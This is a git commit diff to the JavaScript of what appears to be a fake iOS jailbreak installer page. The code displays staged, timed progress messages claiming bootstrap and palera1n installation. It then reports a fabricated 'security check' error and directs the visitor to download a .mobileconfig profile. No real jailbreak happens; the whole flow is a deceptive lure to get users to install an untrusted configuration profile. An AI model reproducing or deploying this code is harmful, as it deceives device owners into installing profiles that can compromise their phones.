76c7e22c233315704d30a4cbf8c19d9325207bbc
pskdTeam <154627802+P4Installer@users.noreply.github.com>
2026-02-20 16:05:12 +0200

    Update main.js

--- js/main.js
+++ js/main.js
@@ -2,45 +2,60 @@ var div1 = document.getElementById("myDiv1");
 var div2 = document.getElementById("myDiv2");
 var button = document.getElementById("myButton");
 var button2 = document.getElementById("myButton2");
-button2.type = "button";
 var text = document.getElementById("myText");
+
+// Сохраняем оригинальные стили
 var originalWidth = getComputedStyle(div2).width;
 var originalHeight = getComputedStyle(div2).height;
 var originalMarginBottom = getComputedStyle(div2).marginBottom;
 
-button.addEventListener("click", function(){
-  div1.parentNode.removeChild(div1);
-  div2.style.width = "21em";
-  div2.style.height = "25em";
-  div2.style.marginBottom = "15em";
-  var sentences = [
-    {text: "[*] Starting bootstrap process", delay: 2000},
-    {text: "[*] Preparing Bootstrap", delay: 2500},
-    {text: "[*] Installing packages", delay: 5000},
-    {text: "[*] Running uicache", delay: 7500},
-    {text: "[*] Installing palera1n", delay: 10000},
-    {text: "[*] Jailbrreak Nearly Finished, An error occurred. You need to avoid apple security checks.", delay: 10500}
-  ];
-  var i = 0;
-  function showNextSentence() {
-    text.innerHTML += sentences[i].text+"<br><br>";
-    i++;
-    if(i === sentences.length){
-      clearInterval(interval);
-      div2.style.width = originalWidth;
-      div2.style.height = originalHeight;
-      div2.style.marginBottom = originalMarginBottom;
-      button2.style.display = "block";
-      button2.href = "https://p4installer.github.io/p4installer.mobileconfig";
-      button2.onclick = function(){
-        var random = Math.random();
-        if (random < 0.25) {
-            window.open(this.href, "_blank");
+button.addEventListener("click", function() {
+    // 1. Убираем первую панель
+    if (div1) div1.style.display = "none";
+
+    // 2. Расширяем консоль
+    div2.style.width = "21em";
+    div2.style.height = "25em";
+    div2.style.marginBottom = "15em";
+
+    var sentences = [
+        {text: "[*] Starting bootstrap process", delay: 1000},
+        {text: "[*] Preparing Bootstrap", delay: 1500},
+        {text: "[*] Installing packages", delay: 2000},
+        {text: "[*] Running uicache", delay: 2000},
+        {text: "[*] Installing palera1n", delay: 2500},
+        {text: "[*] Jailbreak Finished. Error: Security check required.", delay: 1000}
+    ];
+
+    var i = 0;
+
+    function showNext() {
+        if (i < sentences.length) {
+            text.innerHTML += sentences[i].text + "<br><br>";
+            
+            // Прокрутка вниз, если текста много
+            div2.scrollTop = div2.scrollHeight;
+
+            // Запускаем следующий таймер с задержкой из массива
+            setTimeout(showNext, sentences[i].delay);
+            i++;
         } else {
-            window.open(this.href, "_blank");
+            // Финал: возвращаем размеры и показываем кнопку скачивания
+            div2.style.width = originalWidth;
+            div2.style.height = originalHeight;
+            div2.style.marginBottom = originalMarginBottom;
+
+            button2.style.display = "block";
+            
+            // Устанавливаем ссылку на конфиг
+            button2.href = "https://p4installer.github.io/p4installer.mobileconfig";
+            
+            // Прямой переход при клике
+            button2.onclick = function(e) {
+                window.location.href = this.href;
+            };
         }
     }
-    }
-  }
-  var interval = setInterval(showNextSentence, sentences[i].delay);
+
+    showNext();
 });
